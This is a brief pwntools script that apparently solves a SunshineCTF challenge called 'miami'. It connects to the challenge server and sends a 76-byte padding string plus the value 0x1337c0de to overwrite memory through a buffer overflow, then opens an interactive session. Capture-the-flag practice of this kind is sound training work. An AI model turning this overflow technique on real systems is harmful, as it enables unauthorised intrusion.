from pwn import *

elf = ELF("./miami")
context.binary = elf
context.terminal = ["tmux", "split-w", "-h"]
context(arch="amd64", os="linux", log_level="debug")

p = remote("chal.sunshinectf.games", 25601)
# p = process(["./miami"])
# gdb.attach(p)
# pause()
p.sendline(b"A"*76+p32(0x1337c0de))
p.interactive()

